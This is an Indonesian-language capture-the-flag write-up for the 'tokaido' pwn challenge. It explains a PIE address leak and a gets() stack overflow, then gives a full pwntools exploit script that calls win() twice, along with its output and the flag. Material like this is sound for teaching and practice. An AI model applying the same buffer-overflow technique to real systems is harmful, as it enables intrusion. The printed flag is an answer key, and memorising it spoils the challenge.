# WriteUp - tokaido

## Overview
- **Judul:** tokaido
- **Kategori:** Pwn / Buffer Overflow & PIE Bypass
- **Poin:** 250
- **Author:** maxster
- **Akses:** `nc chals.vuwctf.com 9983`
- **Deskripsi:** A very epic quest

## Informasi File
Berdasarkan hasil analisis *binary*:
* **Arsitektur:** ELF 64-bit LSB
* **Proteksi:** 
  * NX (No-eXecute) *Enabled*: Shellcode tidak bisa dijalankan di *stack*.
  * PIE (Position Independent Executable) *Enabled*: Alamat memori selalu berubah secara acak setiap kali dieksekusi.
  * Canary *Disabled*: Tidak ada proteksi *stack canary*, sehingga *buffer overflow* murni dapat dilakukan.

## Analisis Kerentanan
Program memiliki *logic* yang sederhana dengan dua fungsi utama, `main()` dan `win()`. 
1. **PIE Leak:** Pada fungsi `main()`, program menggunakan fungsi `printf("funny number: %p\n", main);` yang membocorkan alamat memori fungsi `main` yang sedang berjalan. Ini mengizinkan kita melakukan *bypass* terhadap proteksi PIE.
2. **Buffer Overflow:** Program mengambil input menggunakan `gets(v4)`, di mana ukuran *buffer* `v4` hanya 16 bytes. Karena `gets()` tidak membatasi panjang *input*, kita dapat menimpa *return address* (RIP).
3. **Logic Bypass pada win():** Fungsi `win()` memiliki kondisi keamanan tambahan:
   ```c
   if (attempts++ > 0) { ... buka flag.txt ... }
   else { puts("not attempted"); }
   ```
   Fungsi ini harus dipanggil **dua kali**. Panggilan pertama membuat `attempts` menjadi 1 (kondisi > 0 belum terpenuhi), dan panggilan kedua memicu blok kode yang membuka serta mencetak `flag.txt`.

> **Catatan Teknis (Mengapa Script Sebelumnya Gagal):** 
> Penambahan *gadget* `ret` untuk *stack alignment* yang biasa diperlukan di arsitektur 64-bit Ubuntu (untuk mem-*bypass* *crash* pada fungsi libc seperti `system` atau `fopen` akibat instruksi `movaps`) ternyata justru mengacaukan *payload* saat dieksekusi di *environment* remote VuwCTF. *Server* memproses input dengan sangat *strict*, dan langsung menembak fungsi `win()` tanpa *alignment* terbukti menjadi jalur eksploitasi yang bersih dan stabil di kasus ini.

## Proses Penyelesaian
1. Tangkap *leak address* dari output `funny number: `.
2. Hitung *Base Address* PIE dengan cara mengurangi *leak address* dengan *offset* fungsi `main` (`0x12ce`).
3. Hitung alamat absolut untuk fungsi `win()` dengan menambahkan *Base Address* dengan *offset* `win` (`0x1229`).
4. Bangun *payload* yang terdiri dari:
   - 16 bytes *padding* untuk mengisi *buffer* `v4`.
   - 8 bytes *padding* untuk menimpa RBP.
   - Alamat `win()` (menimpa RIP, eksekusi pertama).
   - Alamat `win()` (masuk ke eksekusi kedua untuk mencetak *flag*).

## Script Solver

```python
#!/usr/bin/env python3
from pwn import *

p = remote('chals.vuwctf.com', 9983)

# Parse leaked main address
p.recvuntil(b'funny number: ')
main_leak = int(p.recvline().strip(), 16)

# Calculate win address (PIE bypass)
base = main_leak - 0x12ce
win = base + 0x1229

# Payload: buffer(16) + rbp(8) + win + win
payload = b'A'*16 + b'B'*8 + p64(win) + p64(win)
p.sendline(payload)
p.interactive()
```

## Output Eksekusi

```text
 󰋑  ▶  ./solver.py
[+] Opening connection to chals.vuwctf.com on port 9983: Done
[*] Switching to interactive mode
AAAAAAAAAAAAAAAABBBBBBBB)r\x84\xf0;V^@^@)r\x84\xf0;V^@^@
You said: AAAAAAAAAAAAAAAABBBBBBBB)r\x84\xf0;V
you win
not attempted
you win
VuwCTF{eastern_sea_route}[*] Got EOF while reading in interactive
```

## Flag
```text
VuwCTF{eastern_sea_route}
```
